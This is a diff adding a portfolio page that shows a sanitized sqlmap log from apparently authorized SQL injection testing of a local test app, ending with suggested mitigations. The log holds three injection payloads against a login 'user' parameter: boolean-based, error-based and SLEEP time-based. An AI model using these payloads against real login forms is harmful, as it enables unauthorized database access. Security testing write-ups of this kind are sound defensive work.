@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="Habtamu Bitew Gashu, cybersecurity, SQL injection, ethical hacking, sqlmap log" />
+    <meta name="description" content="SQL Injection Testing Log from Habtamu Bitew Gashu's ethical cybersecurity testing in a controlled environment." />
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Favicon -->
+    <link id='favicon' rel="shortcut icon" href="../assets/images/favicon.png" type="image/x-png">
+    <title>SQL Injection Log 1 | Habtamu Bitew Gashu</title>
+</head>
+<body oncontextmenu="return false">
+    <!-- navbar starts -->
+    <header>
+        <a href="../index.html" class="logo"><i class="fab fa-node-js"></i> Habtamu</a>
+        <div id="menu" class="fas fa-bars"></div>
+        <nav class="navbar">
+            <ul>
+                <li><a href="../cyberlogs/logs.html">Back to Logs</a></li>
+                <li><a href="../index.html">Back to Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+    <!-- navbar ends -->
+
+    <!-- log section starts -->
+    <section class="log-container">
+        <h2 class="heading"><i class="fas fa-shield-alt"></i> SQL Injection Log <span>LOG-2025-001</span></h2>
+        <p class="qoute">Sanitized log from ethical SQL injection testing in a controlled environment using sqlmap.</p>
+        <div class="log-content">
+            <pre>
+sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: user=-5459' OR 3914=3914#&pwd=sdfgsdf
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: user=dfgsdf' AND (SELECT ... FLOOR(RAND(0)*2))-- VRPJ&pwd=sdfgsdf
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=dfgsdf' AND SLEEP(5)-- vbgY&pwd=sdfgsdf
+---
+web application technology: PHP 8.2.4, Apache 2.4.56
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+---
+Test Environment: Local Test Web App
+Test Date: 2025-03-10
+Mitigations Suggested:
+- Use parameterized queries and prepared statements
+- Implement input validation and sanitization
+- Suppress detailed error messages
+- Use ORM frameworks for database interactions
+            </pre>
+        </div>
+        <div class="backbtn">
+            <a href="../cyberlogs/logs.html" class="btn"><span>Back to Logs</span>
+                <i class="fas fa-arrow-left"></i>
+            </a>
+            <a href="../index.html" class="btn"><span>Back to Portfolio</span>
+                <i class="fas fa-arrow-left"></i>
+            </a>
+        </div>
+    </section>
+    <!-- log section ends -->
+
+    <!-- scroll top btn -->
+    <a href="#top" aria-label="ScrollTop" class="fas fa-angle-up" id="scroll-top"></a>
+    <!-- scroll back to top -->
+
+    <!-- jquery cdn -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <!-- scroll reveal anim -->
+    <script src="https://unpkg.com/scrollreveal"></script>
+
+    <!-- custom js -->
+    <script src="../assets/js/script.js"></script>
+</body>
+</html>
